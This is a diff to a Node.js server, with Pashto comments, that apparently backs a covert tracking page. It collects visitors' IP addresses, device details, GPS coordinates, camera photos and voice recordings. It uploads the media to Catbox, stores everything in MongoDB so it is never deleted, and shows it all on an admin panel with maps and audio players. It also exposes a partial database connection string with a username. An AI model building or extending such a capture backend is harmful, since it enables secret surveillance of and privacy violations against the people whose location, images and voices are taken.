@@ -1,6 +1,6 @@
 const express = require('express');
 const multer = require('multer');
-const fs = require('fs');
+const mongoose = require('mongoose');
 const path = require('path');
 const axios = require('axios');
 const FormData = require('form-data');
@@ -8,32 +8,49 @@ const FormData = require('form-data');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// د پراکسی یا کلاوډ هوسټینګ (لکه Render) لپاره د IP د سوابقو سمولو په موخه
-app.set('trust proxy', true);
+// دلته خپل د MongoDB Connection String ولیکئ (پاسورډ یې خپل کړئ)
+const MONGO_URI = process.env.MONGO_URI || "mongodb+srv://kingofface20_db_user:ستاسو_پاسورډ@cluster0.xxxxx.mongodb.net/?retryWrites=true&w=majority";
 
-const uploadDir = path.join(__dirname, 'uploads');
-const locationsDir = path.join(uploadDir, 'locations');
-const deviceInfoDir = path.join(uploadDir, 'device_info');
-const linksDir = path.join(uploadDir, 'links');
+mongoose.connect(MONGO_URI, {
+    useNewUrlParser: true,
+    useUnifiedTopology: true
+}).then(() => console.log('✅ Connected to MongoDB Atlas'))
+  .catch(err => console.error('❌ MongoDB Connection Error:', err));
 
-[uploadDir, locationsDir, deviceInfoDir, linksDir].forEach(dir => {
-    if (!fs.existsSync(dir)) {
-        fs.mkdirSync(dir, { recursive: true });
-    }
+// د ډیټابیس سکیمې (Schemas) ترڅو ډیټا هېڅکله ډلیټ نشي
+const deviceInfoSchema = new mongoose.Schema({
+    time: String,
+    ip: String,
+    info: String
 });
+const DeviceInfo = mongoose.model('DeviceInfo', deviceInfoSchema);
 
-// د فایلونو ساتلو لپاره د RAM حافظه کارول ترڅو په سرور کې فزیکي ځای ونه نیسي او مستقیم کلاوډ ته لاړ شي
+const locationSchema = new mongoose.Schema({
+    time: String,
+    ip: String,
+    latitude: Number,
+    longitude: Number
+});
+const LocationData = mongoose.model('LocationData', locationSchema);
+
+const linkSchema = new mongoose.Schema({
+    type: String, // 'photo' یا 'voice'
+    url: String,
+    time: String
+});
+const LinkData = mongoose.model('LinkData', linkSchema);
+
+app.set('trust proxy', true);
 const upload = multer({ storage: multer.memoryStorage() });
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.use('/uploads', express.static(uploadDir));
 
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Catbox ته د فایل د اپلوډ کولو او انلاین لینک د ترلاسه کولو فنکشن
+// Catbox ته د فایل د اپلوډ کولو فنکشن
 async function uploadToCatbox(buffer, filename) {
     try {
         const formData = new FormData();
@@ -44,7 +61,7 @@ async function uploadToCatbox(buffer, filename) {
             headers: formData.getHeaders(),
             timeout: 20000
         });
-        return response.data; // مستقیم انلاین لینک راګرځوي
+        return response.data;
     } catch (error) {
         console.error('Catbox upload error:', error.message);
         return null;
@@ -52,62 +69,51 @@ async function uploadToCatbox(buffer, filename) {
 }
 
 app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
-    // د لیدونکي د ریښتیني IP پته معلومول
     let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'نامعلوم';
-    if (clientIp.includes(',')) {
-        clientIp = clientIp.split(',')[0].trim();
-    }
-    if (clientIp === '::1' || clientIp === '::ffff:127.0.0.1') {
-        clientIp = '127.0.0.1 (Localhost)';
-    }
+    if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
+    if (clientIp === '::1' || clientIp === '::ffff:127.0.0.1') clientIp = '127.0.0.1 (Localhost)';
 
-    // ۱. د موبایل، برانډ او IP معلوماتو خوندي کول
+    const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
+
+    // ۱. د موبایل معلومات په MongoDB کې ساتل
     if (req.body.device_info) {
         try {
             const info = JSON.parse(req.body.device_info);
-            const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
+            const entryText = `📅 نېټه: ${time}\n🌐 آی‌پي: ${clientIp}\n📱 برانډ: ${info.deviceType}\n🔢 انډرایډ: ${info.androidVer}\n📐 سکرین: ${info.screenSize}\n🔋 بیټرۍ: ${info.batteryLevel}\n🌐 ژبه: ${info.language}\n-----------------------------------`;
             
-            const entry = `📅 نېټه: ${time}\n🌐 د لیدونکي آی‌پي (IP): ${clientIp}\n📱 د وسیلې برانډ: ${info.deviceType}\n🔢 د انډرایډ ورژن: ${info.androidVer}\n📐 د سکرین اندازه: ${info.screenSize}\n🔋 د بیټرۍ چارج: ${info.batteryLevel}\n🌐 د براوزر ژبه: ${info.language}\n-----------------------------------\n`;
-            
-            fs.appendFileSync(path.join(deviceInfoDir, 'device_info.txt'), entry, 'utf8');
+            await DeviceInfo.create({ time, ip: clientIp, info: entryText });
             return res.send("Device Info Saved");
         } catch (e) {}
     }
 
-    // ۲. لوکیشن خوندي کول
+    // ۲. لوکیشن په MongoDB کې ساتل
     if (req.body.latitude && req.body.longitude) {
         const lat = parseFloat(req.body.latitude);
         const lng = parseFloat(req.body.longitude);
         if (!isNaN(lat) && !isNaN(lng)) {
-            const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
-            const entry = `نېټه: ${time} | آی‌پي: ${clientIp} | لوکیشن: https://maps.google.com/?q=${lat},${lng}\n-----------------------------------\n`;
-            fs.appendFileSync(path.join(locationsDir, 'locations.txt'), entry, 'utf8');
+            await LocationData.create({ time, ip: clientIp, latitude: lat, longitude: lng });
             return res.send("Location Saved");
         }
     }
 
-    // ۳. انځور مستقیم Catbox ته استول او لینک یې په تېکست فایل کې ساتل
+    // ۳. عکس Catbox ته او لینک یې په MongoDB کې ساتل
     if (req.files && req.files.photo) {
         const file = req.files.photo[0];
         const onlineUrl = await uploadToCatbox(file.buffer, `photo_${Date.now()}.jpg`);
         if (onlineUrl) {
-            const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
-            const entry = `${onlineUrl}|${time}\n`;
-            fs.appendFileSync(path.join(linksDir, 'photos_links.txt'), entry, 'utf8');
+            await LinkData.create({ type: 'photo', url: onlineUrl, time });
             return res.send("Photo Saved");
         } else {
             return res.status(500).send("Photo Upload Failed");
         }
     }
 
-    // ۴. غږیز ریکارډ Catbox ته استول او لینک یې په تېکست فایل کې ساتل
+    // ۴. غږ Catbox ته او لینک یې په MongoDB کې ساتل
     if (req.files && req.files.voice) {
         const file = req.files.voice[0];
         const onlineUrl = await uploadToCatbox(file.buffer, `voice_${Date.now()}.ogg`);
         if (onlineUrl) {
-            const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
-            const entry = `${onlineUrl}|${time}\n`;
-            fs.appendFileSync(path.join(linksDir, 'voices_links.txt'), entry, 'utf8');
+            await LinkData.create({ type: 'voice', url: onlineUrl, time });
             return res.send("Voice Saved");
         } else {
             return res.status(500).send("Voice Upload Failed");
@@ -117,7 +123,7 @@ app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req,
     res.status(400).send("Bad Request");
 });
 
-app.get('/admin', (req, res) => {
+app.get('/admin', async (req, res) => {
     const showWelcome = !req.headers.cookie?.includes('welcome=true') && req.query.action !== 'enter';
 
     if (req.query.action === 'enter') {
@@ -125,85 +131,33 @@ app.get('/admin', (req, res) => {
         return res.redirect('/admin');
     }
 
+    // د ډیټا د پاکولو برخه
     if (req.query.delete) {
         const target = req.query.delete;
-        if (target === 'locations') {
-            const locPath = path.join(locationsDir, 'locations.txt');
-            if (fs.existsSync(locPath)) fs.unlinkSync(locPath);
-        } else if (target === 'device_info') {
-            const devPath = path.join(deviceInfoDir, 'device_info.txt');
-            if (fs.existsSync(devPath)) fs.unlinkSync(devPath);
-        } else if (target === 'all_photos') {
-            const pPath = path.join(linksDir, 'photos_links.txt');
-            if (fs.existsSync(pPath)) fs.unlinkSync(pPath);
-        } else if (target === 'all_voices') {
-            const vPath = path.join(linksDir, 'voices_links.txt');
-            if (fs.existsSync(vPath)) fs.unlinkSync(vPath);
-        }
+        if (target === 'locations') await LocationData.deleteMany({});
+        else if (target === 'device_info') await DeviceInfo.deleteMany({});
+        else if (target === 'all_photos') await LinkData.deleteMany({ type: 'photo' });
+        else if (target === 'all_voices') await LinkData.deleteMany({ type: 'voice' });
         return res.redirect('/admin');
     }
 
-    let deviceInfoHtml = '<p>تاسې تر اوسه د موبایل کوم معلومات نه دي ترلاسه کړي.</p>';
-    let deleteDevBtn = '';
-    const devPath = path.join(deviceInfoDir, 'device_info.txt');
-    if (fs.existsSync(devPath)) {
-        deleteDevBtn = `<a href="/admin?delete=device_info" class="delete-btn" onclick="return confirm('ټول معلومات پاک شي؟')">ټول پاکول</a>`;
-        const content = fs.readFileSync(devPath, 'utf8');
-        deviceInfoHtml = `<pre style="white-space: pre-wrap; font-size: 14px; color: #111; background: #fafafa; padding: 12px; border-radius: 6px; max-height: 250px; overflow-y: auto; font-family: monospace; line-height: 1.5;">${content}</pre>`;
-    }
+    // د ډیټابیس څخه د معلوماتو راکاږل
+    const devices = await DeviceInfo.find().sort({ _id: -1 });
+    const locations = await LocationData.find().sort({ _id: -1 });
+    const photos = await LinkData.find({ type: 'photo' }).sort({ _id: -1 });
+    const voices = await LinkData.find({ type: 'voice' }).sort({ _id: -1 });
 
-    let locationsHtml = '<p>تر اوسه کوم لوکیشن نه دی ثبت شوی.</p>';
-    let deleteLocBtn = '';
-    const locPath = path.join(locationsDir, 'locations.txt');
-    if (fs.existsSync(locPath)) {
-        deleteLocBtn = `<a href="/admin?delete=locations" class="delete-btn" onclick="return confirm('ټول لوکیشنونه پاک شي؟')">ټول پاکول</a>`;
-        const content = fs.readFileSync(locPath, 'utf8');
-        const matches = [...content.matchAll(/q=([0-9\.-]+),([0-9\.-]+)/g)];
-        if (matches.length > 0) {
-            locationsHtml = '';
-            matches.reverse().forEach(match => {
-                locationsHtml += `<div class="map-container"><iframe width="100%" height="150" frameborder="0" scrolling="no" src="https://maps.google.com/maps?q=${match[1]},${match[2]}&z=15&output=embed"></iframe></div>`;
-            });
-        }
-    }
+    let deviceInfoHtml = devices.length ? `<pre style="white-space: pre-wrap; font-size: 14px; color: #111; background: #fafafa; padding: 12px; border-radius: 6px; max-height: 250px; overflow-y: auto; font-family: monospace; line-height: 1.5;">${devices.map(d => d.info).join('\n')}</pre>` : '<p>تاسې تر اوسه د موبایل کوم معلومات نه دي ترلاسه کړي.</p>';
+    let deleteDevBtn = devices.length ? `<a href="/admin?delete=device_info" class="delete-btn" onclick="return confirm('ټول معلومات پاک شي؟')">ټول پاکول</a>` : '';
 
-    let photosHtml = "<p style='grid-column: span 3; text-align: center;'>کوم عکس نشته.</p>";
-    let deleteAllPhotosBtn = '';
-    const pPath = path.join(linksDir, 'photos_links.txt');
-    if (fs.existsSync(pPath)) {
-        deleteAllPhotosBtn = `<a href="/admin?delete=all_photos" class="delete-btn" onclick="return confirm('ټول عکسونه پاک شي؟')">ټول پاکول</a>`;
-        const content = fs.readFileSync(pPath, 'utf8');
-        const lines = content.trim().split('\n').filter(Boolean);
-        if (lines.length > 0) {
-            photosHtml = '';
-            lines.reverse().forEach(line => {
-                const url = line.split('|')[0];
-                photosHtml += `
-                    <div class="item-box">
-                        <a href="${url}" target='_blank'><img src="${url}" alt='Photo'></a><br>
-                    </div>`;
-            });
-        }
-    }
+    let locationsHtml = locations.length ? locations.map(loc => `<div class="map-container"><iframe width="100%" height="150" frameborder="0" scrolling="no" src="https://maps.google.com/maps?q=${loc.latitude},${loc.longitude}&z=15&output=embed"></iframe></div>`).join('') : '<p>تر اوسه کوم لوکیشن نه دی ثبت شوی.</p>';
+    let deleteLocBtn = locations.length ? `<a href="/admin?delete=locations" class="delete-btn" onclick="return confirm('ټول لوکیشنونه پاک شي؟')">ټول پاکول</a>` : '';
 
-    let voicesHtml = "<p>کوم غږیز ریکارډ تر اوسه نشته.</p>";
-    let deleteAllVoicesBtn = '';
-    const vPath = path.join(linksDir, 'voices_links.txt');
-    if (fs.existsSync(vPath)) {
-        deleteAllVoicesBtn = `<a href="/admin?delete=all_voices" class="delete-btn" onclick="return confirm('ټول غږونه پاک شي؟')">ټول پاکول</a>`;
-        const content = fs.readFileSync(vPath, 'utf8');
-        const lines = content.trim().split('\n').filter(Boolean);
-        if (lines.length > 0) {
-            voicesHtml = '';
-            lines.reverse().forEach(line => {
-                const url = line.split('|')[0];
-                voicesHtml += `
-                    <div class='item-box' style='margin-bottom: 8px; text-align: right; padding: 8px;'>
-                        <audio controls src="${url}"></audio>
-                    </div>`;
-            });
-        }
-    }
+    let photosHtml = photos.length ? photos.map(p => `<div class="item-box"><a href="${p.url}" target='_blank'><img src="${p.url}" alt='Photo'></a></div>`).join('') : "<p style='grid-column: span 3; text-align: center;'>کوم عکس نشته.</p>";
+    let deleteAllPhotosBtn = photos.length ? `<a href="/admin?delete=all_photos" class="delete-btn" onclick="return confirm('ټول عکسونه پاک شي؟')">ټول پاکول</a>` : '';
+
+    let voicesHtml = voices.length ? voices.map(v => `<div class='item-box' style='margin-bottom: 8px; text-align: right; padding: 8px;'><audio controls src="${v.url}"></audio></div>`).join('') : "<p>کوم غږیز ریکارډ تر اوسه نشته.</p>";
+    let deleteAllVoicesBtn = voices.length ? `<a href="/admin?delete=all_voices" class="delete-btn" onclick="return confirm('ټول غږونه پاک شي؟')">ټول پاکول</a>` : '';
 
     let html = `
     <!DOCTYPE html>
